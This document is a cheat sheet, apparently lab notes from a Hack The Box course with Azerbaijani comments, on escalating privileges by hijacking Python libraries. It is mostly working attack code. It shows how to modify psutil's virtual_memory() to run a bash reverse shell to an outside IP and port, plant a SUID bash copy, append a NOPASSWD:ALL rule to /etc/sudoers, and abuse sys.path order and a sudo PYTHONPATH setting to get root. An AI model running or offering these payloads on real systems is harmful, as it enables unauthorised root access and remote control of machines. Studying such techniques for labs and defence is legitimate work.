# Python Library Hijacking
```powershell
Vector 1
sudo -l

find / -perm -4000 -name "*.py" 2>/dev/null
find / -perm -2000 -name "*.py" 2>/dev/null

cat script.py | grep "import"

grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# Əgər -rw-r--rw- görürsənsə - YAZMA İCAZƏSİ VAR!

cat /usr/local/lib/python3.8/dist-packages/psutil/__init__.py | grep -A 20 "def virtual_memory"
nano /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

```
### Add module
```powershell
def virtual_memory():
    with open("/tmp/debug.txt", "w") as f:
        f.write("Hijack calisdi!")
    # 1. HİJACK - Əvvəlcə zərərli kod işləyir
    import os
    os.system('id') # Test üçün
    # Reverse shell (bash -c istifadəsi daha stabildir)
    os.system('bash -c "bash -i >& /dev/tcp/10.10.15.110/12000 0>&1"')
    # 2. Orijinal məntiq - Proqramın işləməsi üçün lazımdır
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret 

sudo /usr/bin/python3 ./mem_status.py
```
```powershell
VECTOR: Library Path (PYTHONPATH Sırası)

python3 -c 'import sys; print("\n".join(sys.path))'
# /usr/lib/python38.zip        ← 1-ci axtarılır
# /usr/lib/python3.8           ← 2-ci axtarılır

pip3 show psutil
/usr/local/lib/python3.8/dist-packages  ← Aşağı prioritet

ls -la /usr/lib/python3.8
ls -la /usr/lib/python38.zip 2>/dev/null

python3 -c 'import sys; print("\n".join(sys.path))' | while read path; do
    echo -n "$path : "
    ls -ld "$path" 2>/dev/null | awk '{print $1, $3, $4}'
done

nano /usr/lib/python3.8/psutil.py

#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
    # Real bir hücumda:
    os.system('cp /bin/bash /tmp/bash && chmod +s /tmp/bash')
    os.system('echo "htb-student ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')

sudo /usr/bin/python3 mem_status.py
```
```powershell
VECTOR: PYTHONPATH Mühit Dəyişəni

sudo -l

# Axtardığımız şey:
# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
#              ↑
#         Bu flag kritikdir! Mühit dəyişəni təyin etməyə icazə verir

sudo -l | grep SETENV

# /tmp qovluğunda saxta modul yarat (hər kəs yaza bilər)
nano /tmp/psutil.py

#!/usr/bin/env python3
import os
def virtual_memory():
    os.system('id')
    os.system('whoami')

# PYTHONPATH-ı /tmp olaraq təyin edib skripti işlət
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

# Python /tmp-də psutil.py tapır və onu import edir!
# uid=0(root) gid=0(root) groups=0(root)
```
